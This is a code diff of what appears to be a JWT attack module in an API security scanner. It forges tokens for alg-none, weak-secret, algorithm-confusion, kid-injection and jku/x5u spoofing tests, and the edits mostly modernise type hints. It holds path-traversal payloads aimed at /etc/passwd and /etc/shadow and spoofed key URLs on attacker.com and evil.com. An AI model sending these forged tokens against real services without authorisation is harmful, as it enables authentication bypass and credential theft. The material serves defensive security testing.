@@ -36,28 +36,19 @@ scan finds nothing, Req 18.2).
 """
 
 import copy
+import hashlib
+import hmac
 import inspect
 import json
 import time
 import uuid
-import hmac
-import hashlib
 from datetime import datetime
-from typing import Any, Dict, List, Optional
+from typing import Any
 from urllib.parse import urlparse
 
 from core.config import Severity
 from core.logging import get_logger
 from utils.findings import Finding
-from utils.jwt_utils import (
-    ES_SIG_BYTES,
-    base64url_encode,
-    decode_jwt,
-    encode_jwt,
-    psychic_signature_segment,
-    verify_hmac_secret,
-    _public_key_variants,
-)
 from utils.jwt_attack_models import (
     AttackConfiguration,
     AttackResult,
@@ -71,8 +62,16 @@ from utils.jwt_attack_models import (
     VulnerabilitySeverity,
 )
 from utils.jwt_attack_response_analyzer import JWTAttackResponseAnalyzer
+from utils.jwt_utils import (
+    ES_SIG_BYTES,
+    _public_key_variants,
+    base64url_encode,
+    decode_jwt,
+    encode_jwt,
+    psychic_signature_segment,
+    verify_hmac_secret,
+)
 from utils.safe_mode import SAFE_METHODS
-
 
 # ----------------------------------------------------------------------------
 # JWT -> unified findings mapping (Requirement 18)
@@ -81,7 +80,7 @@ from utils.safe_mode import SAFE_METHODS
 # Reconcile the JWT ``VulnerabilitySeverity`` vocabulary (Critical/High/Medium/
 # Low/Info) with the Findings_Collector ``core.config.Severity`` levels
 # (CRITICAL/HIGH/MEDIUM/LOW/INFO) — Requirement 18.1.
-_SEVERITY_MAP: Dict[VulnerabilitySeverity, Severity] = {
+_SEVERITY_MAP: dict[VulnerabilitySeverity, Severity] = {
     VulnerabilitySeverity.CRITICAL: Severity.CRITICAL,
     VulnerabilitySeverity.HIGH: Severity.HIGH,
     VulnerabilitySeverity.MEDIUM: Severity.MEDIUM,
@@ -92,7 +91,7 @@ _SEVERITY_MAP: Dict[VulnerabilitySeverity, Severity] = {
 # Map every ``AttackType`` to its unified Finding_Category (Requirement 18.4).
 # Each category resolves to a Severity and OWASP_Category API2 in
 # ``utils.findings.FindingsCollector`` (Requirement 18.3).
-_ATTACK_TYPE_TO_CATEGORY: Dict[AttackType, str] = {
+_ATTACK_TYPE_TO_CATEGORY: dict[AttackType, str] = {
     AttackType.ALG_NONE: "JWT_NONE_ALGORITHM",
     AttackType.NULL_SIGNATURE: "JWT_NULL_SIGNATURE",
     AttackType.WEAK_SECRET: "JWT_WEAK_SECRET",
@@ -136,7 +135,7 @@ JWT_JKU_SSRF_CATEGORY = "JWT_JKU_SSRF"
 JWT_JWKS_SPOOF_CATEGORY = "JWT_JWKS_SPOOF"
 
 
-def _format_baseline_evidence(attack_result: AttackResult) -> List[str]:
+def _format_baseline_evidence(attack_result: AttackResult) -> list[str]:
     """Render the baseline-comparison evidence for a reported vulnerability.
 
     Included in every reported JWT vulnerability alongside the analyzer's own
@@ -175,7 +174,7 @@ def _resolve_finding_category(attack_result: AttackResult) -> str:
     return _ATTACK_TYPE_TO_CATEGORY[attack_result.attack_type]
 
 
-def _category_specific_evidence(attack_result: AttackResult, category: str) -> List[str]:
+def _category_specific_evidence(attack_result: AttackResult, category: str) -> list[str]:
     """Render category-specific baseline-comparison evidence (Reqs 58.4, 59.4, 63.3, 64.3).
 
     Adds a concise, defensively-decoded evidence line per new/blank category:
@@ -255,7 +254,7 @@ def jwt_assessment_to_finding(attack_result: AttackResult, scan_id: str) -> Find
 
     # Evidence = analyzer evidence + category-specific evidence + baseline
     # comparison + confidence (Reqs 19.3, 58.4, 59.4, 63.3, 64.3).
-    evidence_lines: List[str] = list(assessment.evidence)
+    evidence_lines: list[str] = list(assessment.evidence)
     evidence_lines.extend(_category_specific_evidence(attack_result, category))
     evidence_lines.extend(_format_baseline_evidence(attack_result))
     evidence_lines.append(f"Confidence score: {assessment.confidence_score}")
@@ -289,14 +288,14 @@ def jwt_assessment_to_finding(attack_result: AttackResult, scan_id: str) -> Find
 # Default weak-secret candidates used by the WEAK_SECRET vector when the caller
 # does not supply its own wordlist. Mirrors the fallback list used by
 # ``modules/owasp/auth_testing.py`` so the vocabulary is uniform.
-DEFAULT_WEAK_SECRETS: List[str] = [
+DEFAULT_WEAK_SECRETS: list[str] = [
     "secret", "password", "123456", "admin", "test", "key",
     "jwt", "token", "your-256-bit-secret", "your-secret-key",
     "changeme", "secretkey", "supersecret",
 ]
 
 # kid injection payloads (path traversal, injection, SSRF, encoding tricks).
-_KID_INJECTION_PAYLOADS: List[str] = [
+_KID_INJECTION_PAYLOADS: list[str] = [
     "../../etc/passwd",
     "../../../etc/shadow",
     "/dev/null",
@@ -323,7 +322,7 @@ _KID_INJECTION_PAYLOADS: List[str] = [
 # resulting predictable key and observing acceptance"). ``/dev/null`` and empty
 # files yield an empty ("") HMAC key; SQL injection returning NULL and a file
 # whose contents are attacker-known collapse to the same predictable-key case.
-_KID_PREDICTABLE_KEY_PAYLOADS: Dict[str, str] = {
+_KID_PREDICTABLE_KEY_PAYLOADS: dict[str, str] = {
     # Path traversal to a predictable/empty file -> empty signing key.
     "/dev/null": "",
     "../../../../../../dev/null": "",
@@ -337,7 +336,7 @@ _KID_PREDICTABLE_KEY_PAYLOADS: Dict[str, str] = {
 }
 
 # jku/x5u spoofing URLs (attacker-controlled, SSRF, file, protocol variations).
-_JWKS_SPOOF_URLS: List[str] = [
+_JWKS_SPOOF_URLS: list[str] = [
     "http://attacker.com/.well-known/jwks.json",
     "https://evil.com/jwks.json",
     "http://localhost:8080/jwks.json",
@@ -360,7 +359,7 @@ _JWKS_SPOOF_URLS: List[str] = [
 _ATTACKER_KEY_SOURCE_SECRET = "attacker-hosted-signing-key"
 
 # Inline malicious JWK structures embedded via the header ``jwk`` parameter.
-_INLINE_JWKS: List[Dict] = [
+_INLINE_JWKS: list[dict] = [
     {
         "kty": "RSA",
         "use": "sig",
@@ -444,15 +443,15 @@ class JWTAttackEngine:
     """
 
     def __init__(self, target_url: str, original_token: str, http_engine,
-                 signing_secret: Optional[str] = None,
-                 public_key_material: Optional[str] = None,
+                 signing_secret: str | None = None,
+                 public_key_material: str | None = None,
                  safe_mode: bool = False,
-                 custom_headers: Optional[Dict[str, str]] = None,
-                 post_data: Optional[str] = None,
-                 weak_secrets: Optional[List[str]] = None,
-                 fuzz_target: Optional[str] = None,
-                 fuzz_values: Optional[List[str]] = None,
-                 canary_value: Optional[str] = None):
+                 custom_headers: dict[str, str] | None = None,
+                 post_data: str | None = None,
+                 weak_secrets: list[str] | None = None,
+                 fuzz_target: str | None = None,
+                 fuzz_values: list[str] | None = None,
+                 canary_value: str | None = None):
         self.target_url = target_url
         self.original_token = original_token
         self.http_engine = http_engine
@@ -469,10 +468,10 @@ class JWTAttackEngine:
         self.logger = get_logger(__name__).bind(component="jwt_attack_engine")
 
         # Session / flow state (folded from the former orchestrator).
-        self.session: Optional[AttackSession] = None
-        self.baseline_response: Optional[BaselineResponse] = None
-        self.response_analyzer: Optional[JWTAttackResponseAnalyzer] = None
-        self.attack_results: List[AttackResult] = []
+        self.session: AttackSession | None = None
+        self.baseline_response: BaselineResponse | None = None
+        self.response_analyzer: JWTAttackResponseAnalyzer | None = None
+        self.attack_results: list[AttackResult] = []
 
         # Lazily-created collaborators reused for payload-sensitivity analysis
         # (Requirement 43). The Req-12 corroboration discipline lives in
@@ -489,7 +488,7 @@ class JWTAttackEngine:
             self.decoded_token = decode_jwt(original_token)
         except Exception as e:
             self.logger.error("Invalid JWT token provided", error=str(e))
-            raise ValueError(f"Invalid JWT token: {str(e)}")
+            raise ValueError(f"Invalid JWT token: {str(e)}") from e
 
         self.logger.info("JWT Attack Engine initialized",
                          target_url=target_url,
@@ -509,14 +508,14 @@ class JWTAttackEngine:
         """
         return self.signing_secret if self.signing_secret else "secret"
 
-    def _base_header(self) -> Dict:
+    def _base_header(self) -> dict:
         return copy.deepcopy(self.decoded_token['header'])
 
-    def _base_payload(self) -> Dict:
+    def _base_payload(self) -> dict:
         return copy.deepcopy(self.decoded_token['payload'])
 
     @staticmethod
-    def _encode_unsigned(header: Dict, payload: Dict) -> str:
+    def _encode_unsigned(header: dict, payload: dict) -> str:
         """Encode ``header.payload.`` with an empty signature segment."""
         header_encoded = base64url_encode(
             json.dumps(header, separators=(',', ':')).encode('utf-8'))
@@ -527,7 +526,7 @@ class JWTAttackEngine:
     # ------------------------------------------------------------------
     # Per-vector token generation
     # ------------------------------------------------------------------
-    def generate_token(self, attack_type: AttackType) -> List[str]:
+    def generate_token(self, attack_type: AttackType) -> list[str]:
         """Generate malicious tokens for ``attack_type``.
 
         Returns a list with at least one non-empty token for every one of the
@@ -565,7 +564,7 @@ class JWTAttackEngine:
                           attack_type=attack_type.value, count=len(tokens))
         return tokens
 
-    def _generate_alg_none(self) -> List[str]:
+    def _generate_alg_none(self) -> list[str]:
         """ALG_NONE: set ``alg`` to ``none`` and drop the signature (no key)."""
         header = self._base_header()
         header['alg'] = 'none'
@@ -574,7 +573,7 @@ class JWTAttackEngine:
         # Both the trailing-dot and no-dot variants are exercised.
         return [unsigned, unsigned.rstrip('.')]
 
-    def _generate_null_signature(self) -> List[str]:
+    def _generate_null_signature(self) -> list[str]:
         """NULL_SIGNATURE: original header/payload with null signatures (no key)."""
         header = self._base_header()
         payload = self._base_payload()
@@ -593,7 +592,7 @@ class JWTAttackEngine:
         ]
         return [f"{header_encoded}.{payload_encoded}.{sig}" for sig in null_signatures]
 
-    def _generate_weak_secret(self) -> List[str]:
+    def _generate_weak_secret(self) -> list[str]:
         """WEAK_SECRET: re-sign the token with each weak-secret candidate.
 
         Included as a first-class executable vector (Requirement 15.3). Each
@@ -615,9 +614,9 @@ class JWTAttackEngine:
 
         # Prepend the blank/empty-secret candidate, de-duplicating so a wordlist
         # that already contains "" does not produce it twice (Req 58.1).
-        candidates: List[str] = [""] + [s for s in self.weak_secrets if s != ""]
+        candidates: list[str] = [""] + [s for s in self.weak_secrets if s != ""]
 
-        tokens: List[str] = []
+        tokens: list[str] = []
         for secret in candidates:
             try:
                 tokens.append(encode_jwt(header, payload, secret))
@@ -626,7 +625,7 @@ class JWTAttackEngine:
                                   secret=secret, error=str(e))
         return tokens
 
-    def _generate_algorithm_confusion(self) -> List[str]:
+    def _generate_algorithm_confusion(self) -> list[str]:
         """ALGORITHM_CONFUSION: RS*/ES* -> HS256 key confusion (Substitution Attack).
 
         Re-signs the ORIGINAL header/payload as an HS256 token using the
@@ -664,7 +663,7 @@ class JWTAttackEngine:
             json.dumps(payload, separators=(',', ':')).encode('utf-8'))
         signing_input = f"{header_encoded}.{payload_encoded}"
 
-        tokens: List[str] = []
+        tokens: list[str] = []
         for representation_name, key_bytes in variants:
             try:
                 signature = hmac.new(
@@ -675,7 +674,7 @@ class JWTAttackEngine:
                                   representation=representation_name, error=str(e))
         return tokens
 
-    def _generate_kid_injection(self) -> List[str]:
+    def _generate_kid_injection(self) -> list[str]:
         """KID_INJECTION: malicious ``kid`` header exercising SQLi, path
         traversal (including forcing a predictable/empty key such as
         ``/dev/null``), and file inclusion (Requirement 44.1).
@@ -694,7 +693,7 @@ class JWTAttackEngine:
         """
         real_key = self._signing_key()
         payload = self._base_payload()
-        tokens: List[str] = []
+        tokens: list[str] = []
 
         # Group 1: injection probes signed with the operator/real key.
         for injection in _KID_INJECTION_PAYLOADS:
@@ -717,11 +716,11 @@ class JWTAttackEngine:
                                   payload=injection, error=str(e))
         return tokens
 
-    def _generate_jwks_spoof(self) -> List[str]:
+    def _generate_jwks_spoof(self) -> list[str]:
         """JWKS_SPOOF: malicious ``jku``/``x5u`` header signed with the real key."""
         key = self._signing_key()
         payload = self._base_payload()
-        tokens: List[str] = []
+        tokens: list[str] = []
         for url in _JWKS_SPOOF_URLS:
             for header_param in ('jku', 'x5u'):
                 header = self._base_header()
@@ -733,11 +732,11 @@ class JWTAttackEngine:
                                       url=url, param=header_param, error=str(e))
         return tokens
 
-    def _generate_inline_jwks(self) -> List[str]:
+    def _generate_inline_jwks(self) -> list[str]:
         """INLINE_JWKS: embedded ``jwk`` header signed with the real key."""
         key = self._signing_key()
         payload = self._base_payload()
-        tokens: List[str] = []
+        tokens: list[str] = []
         for jwk in _INLINE_JWKS:
             header = self._base_header()
             header['jwk'] = jwk
@@ -748,7 +747,7 @@ class JWTAttackEngine:
                                   kid=jwk.get('kid', 'unknown'), error=str(e))
         return tokens
 
-    def _generate_privilege_escalation(self) -> List[str]:
+    def _generate_privilege_escalation(self) -> list[str]:
         """PRIVILEGE_ESCALATION: elevate role claims, signed with the real key."""
         key = self._signing_key()
         header = self._base_header()
@@ -758,7 +757,7 @@ class JWTAttackEngine:
         payload['is_admin'] = True
         return [encode_jwt(header, payload, key)]
 
-    def _generate_user_impersonation(self) -> List[str]:
+    def _generate_user_impersonation(self) -> list[str]:
         """USER_IMPERSONATION: rewrite identity claims, signed with the real key."""
         key = self._signing_key()
         header = self._base_header()
@@ -773,7 +772,7 @@ class JWTAttackEngine:
         payload.setdefault('sub', 'admin')
         return [encode_jwt(header, payload, key)]
 
-    def _generate_expiration_bypass(self) -> List[str]:
+    def _generate_expiration_bypass(self) -> list[str]:
         """EXPIRATION_BYPASS: drop ``exp``/``iat``, signed with the real key."""
         key = self._signing_key()
         header = self._base_header()
@@ -782,7 +781,7 @@ class JWTAttackEngine:
         payload.pop('iat', None)
         return [encode_jwt(header, payload, key)]
 
-    def _generate_psychic_signature(self) -> List[str]:
+    def _generate_psychic_signature(self) -> list[str]:
         """PSYCHIC_SIGNATURE: null ``(r == 0, s == 0)`` ECDSA signature (Req 59.2).
 
         Preserves the original header and payload segments byte-for-byte and
@@ -800,7 +799,7 @@ class JWTAttackEngine:
             return []
         return [f"{parts[0]}.{parts[1]}.{psychic_signature_segment(alg)}"]
 
-    def _generate_timestamp_tamper(self) -> List[str]:
+    def _generate_timestamp_tamper(self) -> list[str]:
         """TIMESTAMP_TAMPERING: validly-signed tokens with one tampered time claim.
 
         Produces one validly-signed token per variant (Reqs 64.1, 64.2), each
@@ -832,7 +831,7 @@ class JWTAttackEngine:
             ('iat', future),
         ]
 
-        tokens: List[str] = []
+        tokens: list[str] = []
         for claim, value in variants:
             header = self._base_header()
             payload = self._base_payload()
@@ -844,7 +843,7 @@ class JWTAttackEngine:
                                   claim=claim, value=value, error=str(e))
         return tokens
 
-    def _generate_claim_fuzzing(self) -> List[str]:
+    def _generate_claim_fuzzing(self) -> list[str]:
         """CLAIM_FUZZING: substitute the operator-named claim/header per value.
 
         For the configured ``fuzz_target`` (a claim or header name) and
@@ -862,7 +861,7 @@ class JWTAttackEngine:
         key = self._signing_key()
         target_is_header = self.fuzz_target in self._base_header()
 
-        tokens: List[str] = []
+        tokens: list[str] = []
         for value in self.fuzz_values:
             header = self._base_header()
             payload = self._base_payload()
@@ -878,7 +877,7 @@ class JWTAttackEngine:
                                   value=value, error=str(e))
         return tokens
 
-    def generate_all_tokens(self) -> Dict[AttackType, List[str]]:
+    def generate_all_tokens(self) -> dict[AttackType, list[str]]:
         """Generate tokens for every ``AttackType`` (convenience helper)."""
         return {attack_type: self.generate_token(attack_type)
                 for attack_type in AttackType}
@@ -916,7 +915,7 @@ class JWTAttackEngine:
             self._secret_redactor = BOLATestingModule.__new__(BOLATestingModule)
         return self._secret_redactor
 
-    def _corroborate_sensitive_claim(self, field: str, value: Any) -> Optional[str]:
+    def _corroborate_sensitive_claim(self, field: str, value: Any) -> str | None:
         """Return the sensitivity type of a claim only when corroborated (Req 43.2).
 
         Reuses the Property_Module's Req-12 corroboration discipline: a
@@ -981,7 +980,7 @@ class JWTAttackEngine:
         return redacted_value
 
     def inspect_payload_sensitivity(self, token: str,
-                                    scan_id: str = "") -> List[Finding]:
+                                    scan_id: str = "") -> list[Finding]:
         """Inspect a JWT payload for sensitive claims (Requirement 43).
 
         Decodes the payload and inspects each claim for sensitive data —
@@ -1014,7 +1013,7 @@ class JWTAttackEngine:
         if not isinstance(payload, dict):
             return []
 
-        findings: List[Finding] = []
+        findings: list[Finding] = []
         for field, value in payload.items():
             sensitivity_type = self._corroborate_sensitive_claim(field, value)
             if sensitivity_type is None:
@@ -1053,7 +1052,7 @@ class JWTAttackEngine:
     # kid injection success confirmation (Requirement 44)
     # ------------------------------------------------------------------
     async def _confirm_kid_injection(
-            self, attack_result: Optional[AttackResult]) -> bool:
+            self, attack_result: AttackResult | None) -> bool:
         """Confirm KID_Injection success via evidence (Requirement 44.2).
 
         Reuses the :class:`JWTAttackResponseAnalyzer` assessment carried on the
@@ -1106,7 +1105,7 @@ class JWTAttackEngine:
 
     def _assess_key_source_allowlist(self, header_field: str, key_source_url: str,
                                      accepted: bool,
-                                     outbound_observed: bool) -> Dict[str, Any]:
+                                     outbound_observed: bool) -> dict[str, Any]:
         """Assess whether the jku/x5u key-source domain is constrained by an allowlist.
 
         Reports whether the attacker-controlled key-source domain appears
@@ -1171,9 +1170,9 @@ class JWTAttackEngine:
 
     def _build_jku_ssrf_finding(self, *, header_field: str, key_source_url: str,
                                 token: str, accepted: bool, outbound_observed: bool,
-                                assessment: Optional[VulnerabilityAssessment],
-                                response_details: Optional[ResponseDetails],
-                                allowlist: Dict[str, Any],
+                                assessment: VulnerabilityAssessment | None,
+                                response_details: ResponseDetails | None,
+                                allowlist: dict[str, Any],
                                 scan_id: str) -> Finding:
         """Build the ``JWT_JKU_SSRF`` finding for a confirmed jku/x5u SSRF.
 
@@ -1197,7 +1196,7 @@ class JWTAttackEngine:
                 f"(Requirement 45.3)."
             )
 
-        evidence_lines: List[str] = [
+        evidence_lines: list[str] = [
             f"jku/x5u key-source SSRF: the '{header_field}' header pointed at the "
             f"attacker-controlled key source '{key_source_url}'.",
             basis,
@@ -1255,7 +1254,7 @@ class JWTAttackEngine:
 
     async def test_key_source_ssrf(self, attacker_key_source_url: str,
                                    key_source_observer=None,
-                                   scan_id: str = "") -> List[Finding]:
+                                   scan_id: str = "") -> list[Finding]:
         """Detect jku/x5u key-source SSRF (Requirement 45).
 
         Builds a token referencing ``attacker_key_source_url`` in the ``jku`` and
@@ -1290,13 +1289,13 @@ class JWTAttackEngine:
         """
         await self._establish_baseline()
         method = self._resolve_method()
-        findings: List[Finding] = []
+        findings: list[Finding] = []
 
         for header_field in ('jku', 'x5u'):
             token = self._build_jku_x5u_token(header_field, attacker_key_source_url)
 
-            assessment: Optional[VulnerabilityAssessment] = None
-            response_details: Optional[ResponseDetails] = None
+            assessment: VulnerabilityAssessment | None = None
+            response_details: ResponseDetails | None = None
             accepted = False
             try:
                 response = await self._issue(token, method)
@@ -1370,7 +1369,7 @@ class JWTAttackEngine:
             return "GET"
         return method
 
-    def _build_headers(self, token: str) -> Dict[str, str]:
+    def _build_headers(self, token: str) -> dict[str, str]:
         headers = {
             'Authorization': f'Bearer {token}',
             'Accept': 'application/json',
@@ -1381,7 +1380,7 @@ class JWTAttackEngine:
     async def _issue(self, token: str, method: str):
         """Issue a single request through the shared HTTPRequestEngine."""
         headers = self._build_headers(token)
-        kwargs: Dict = {'headers': headers}
+        kwargs: dict = {'headers': headers}
         if self.post_data and method.upper() in ('POST', 'PUT', 'PATCH'):
             try:
                 kwargs['json'] = json.loads(self.post_data)
@@ -1401,7 +1400,7 @@ class JWTAttackEngine:
             content_length=len(content),
         )
 
-    def _compare_with_baseline(self, response_details: ResponseDetails) -> Dict:
+    def _compare_with_baseline(self, response_details: ResponseDetails) -> dict:
         if not self.baseline_response:
             return {}
         baseline = self.baseline_response.response_details
@@ -1436,7 +1435,7 @@ class JWTAttackEngine:
         self.logger.info("Baseline established",
                          status_code=response_details.status_code)
 
-    def _attack_succeeded(self, assessment: Optional[VulnerabilityAssessment],
+    def _attack_succeeded(self, assessment: VulnerabilityAssessment | None,
                           response_body) -> bool:
         """Decide whether an attack variant succeeded (Reqs 67.3-67.5).
 
@@ -1474,7 +1473,7 @@ class JWTAttackEngine:
 
         return True
 
-    async def execute_attack(self, attack_type: AttackType) -> Optional[AttackResult]:
+    async def execute_attack(self, attack_type: AttackType) -> AttackResult | None:
         """Generate and execute a single attack vector.
 
         Issues every generated variant through the shared engine and returns an
@@ -1491,7 +1490,7 @@ class JWTAttackEngine:
             return None
 
         method = self._resolve_method()
-        result: Optional[AttackResult] = None
+        result: AttackResult | None = None
 
         for token in tokens:
             try:
@@ -1573,9 +1572,9 @@ class JWTAttackEngine:
         self.session = AttackSession(session_id=session_id, configuration=config)
 
     def _generate_summary(self) -> AttackSummary:
-        vulnerabilities_found: List[AttackResult] = []
-        potential_vulnerabilities: List[AttackResult] = []
-        failed_attacks: List[AttackResult] = []
+        vulnerabilities_found: list[AttackResult] = []
+        potential_vulnerabilities: list[AttackResult] = []
+        failed_attacks: list[AttackResult] = []
 
         for result in self.attack_results:
             assessment = result.vulnerability_assessment
@@ -1619,7 +1618,7 @@ class JWTAttackEngine:
             recommendation="No action required for JWT attack vectors.",
         )
 
-    def to_findings(self, summary: AttackSummary, scan_id: str = "") -> List[Finding]:
+    def to_findings(self, summary: AttackSummary, scan_id: str = "") -> list[Finding]:
         """Map an :class:`AttackSummary` to unified :class:`Finding` objects.
 
         Each detected vulnerability (confirmed or potential) is mapped to a
